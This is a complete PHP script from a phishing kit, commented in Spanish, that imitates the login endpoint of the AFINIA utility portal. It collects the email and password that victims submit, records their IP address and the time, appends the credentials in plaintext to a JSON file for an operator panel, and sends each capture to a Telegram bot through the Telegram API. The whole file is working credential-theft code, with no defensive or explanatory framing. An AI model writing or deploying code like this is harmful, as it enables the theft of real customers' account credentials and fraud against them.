<?php
// afinia_login.php — Captura credenciales del login AFINIA (correo/clave del portal)
// y las guarda (JSON) + notifica a Telegram. Compatible con api.php del sitio Afinia.

require_once(__DIR__ . "/../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

// Acepta JSON o form-data (como api.php de Afinia)
$data = [];
if (isset($_SERVER['CONTENT_TYPE']) && stripos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
    $decoded = json_decode(file_get_contents('php://input'), true);
    if (is_array($decoded)) $data = $decoded;
}
$email    = $ifilter->process($data['email'] ?? ($_POST['email'] ?? ($_POST['usr'] ?? '')));
$password = $ifilter->process($data['password'] ?? ($_POST['password'] ?? ($_POST['pas'] ?? '')));

if ($email === '' || $password === '') {
    exit(json_encode(['status' => 'error', 'message' => 'Faltan credenciales']));
}

$ip   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$ip   = trim(explode(',', $ip)[0]);
$hora = date("Y-m-d H:i:s");

// 1) Guardar en archivo JSON (panel: data/afinia_logins.json)
$storeDir = __DIR__ . "/../../../data";
if (!is_dir($storeDir)) { @mkdir($storeDir, 0777, true); }
$storeFile = $storeDir . "/afinia_logins.json";
$registros = file_exists($storeFile) ? (json_decode(file_get_contents($storeFile), true) ?: []) : [];
$registros[] = [
    'email' => $email,
    'password' => $password,
    'ip' => $ip,
    'hora' => $hora,
];
@file_put_contents($storeFile, json_encode($registros, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);

// 2) Cookies de sesión del flujo (compatibilidad con resumen/pasos)
setcookie('correo', $email, time() + 3600);
setcookie('usuario', $email, time() + 3600);

// 3) Notificar a Telegram
$cfg = file_exists(__DIR__ . "/../../../token_bank/config.php") ? require(__DIR__ . "/../../../token_bank/config.php") : [];
$token   = $cfg['bot_token'] ?? "";
$chat_id = $cfg['chat_id'] ?? "";
if ($token && $chat_id) {
    $mensaje = "<b>⚡ Nuevo login AFINIA</b>\n"
             . "<b>Correo:</b> $email\n"
             . "<b>Clave:</b> $password\n"
             . "<b>IP:</b> $ip\n"
             . "<b>Hora:</b> $hora";
    $data = ['chat_id' => $chat_id, 'text' => $mensaje, 'parse_mode' => 'HTML'];
    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
}

exit(json_encode(['status' => 'success']));
